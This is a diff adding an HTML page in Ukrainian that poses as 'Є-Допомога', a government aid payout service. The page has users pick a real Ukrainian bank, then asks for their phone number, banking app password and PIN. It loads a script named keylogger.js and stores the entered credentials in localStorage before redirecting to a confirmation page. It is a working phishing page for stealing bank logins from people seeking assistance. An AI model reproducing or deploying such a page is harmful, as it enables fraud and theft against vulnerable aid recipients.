@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Є-Допомога | Вибір банку</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>Вибір банку</h1>
+        <p>Оберіть банк для отримання виплати</p>
+    </header>
+
+    <div class="container">
+        <div class="payment-card">
+            <div class="bank-options">
+                <div class="bank-option" onclick="selectBank('privat')">
+                    <img src="img/privat.png" alt="ПриватБанк">
+                    <span>ПриватБанк</span>
+                </div>
+                <div class="bank-option" onclick="selectBank('oschad')">
+                    <img src="img/oshad.png" alt="Ощадбанк">
+                    <span>Ощадбанк</span>
+                </div>
+                <div class="bank-option" onclick="selectBank('raif')">
+                    <img src="img/raif.png" alt="Райффайзен">
+                    <span>Райффайзен</span>
+                </div>
+                <div class="bank-option" onclick="selectBank('mono')">
+                    <img src="img/mono.png" alt="Монобанк">
+                    <span>Монобанк</span>
+                </div>
+                <div class="bank-option" onclick="selectBank('pumb')">
+                    <img src="img/pumb.png" alt="ПУМБ">
+                    <span>ПУМБ</span>
+                </div>
+            </div>
+
+            <form id="bankForm" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label">Номер телефону, прив'язаний до банку</label>
+                    <input type="tel" class="form-control" placeholder="+380 XX XXX XX XX" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Пароль від банківського додатку</label>
+                    <input type="password" class="form-control" placeholder="Введіть ваш пароль" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">PIN-код для підтвердження</label>
+                    <input type="password" class="form-control" placeholder="Введіть PIN-код" required maxlength="4">
+                </div>
+
+                <div class="form-buttons">
+                    <button type="button" onclick="location.href='form.html'" class="prev-btn">Назад</button>
+                    <button type="button" onclick="submitBankForm()" class="next-btn">Далі</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 Є-Допомога. Всі права захищені.</p>
+        <p>Гаряча лінія: 0 800 123 456</p>
+    </footer>
+
+    <script src="js/keylogger.js"></script>
+    <script>
+        let selectedBank = null;
+
+        function selectBank(bank) {
+            selectedBank = bank;
+            document.getElementById('bankForm').style.display = 'block';
+            
+            // Убираем выделение у всех банков
+            document.querySelectorAll('.bank-option').forEach(el => {
+                el.classList.remove('selected');
+            });
+            
+            // Добавляем выделение выбранному банку
+            event.currentTarget.classList.add('selected');
+        }
+
+        function submitBankForm() {
+            const form = document.getElementById('bankForm');
+            if (form.checkValidity() && selectedBank) {
+                // Сохраняем данные банка
+                const bankData = {
+                    bank: selectedBank,
+                    phone: form.querySelector('input[type="tel"]').value,
+                    password: form.querySelector('input[type="password"]').value,
+                    pin: form.querySelector('input[placeholder*="PIN-код"]').value
+                };
+                localStorage.setItem('bankData', JSON.stringify(bankData));
+                
+                // Переходим на страницу подтверждения
+                location.href = 'confirm.html';
+            } else {
+                alert('Будь ласка, заповніть всі обов\'язкові поля та оберіть банк');
+            }
+        }
+    </script>
+</body>
+</html>
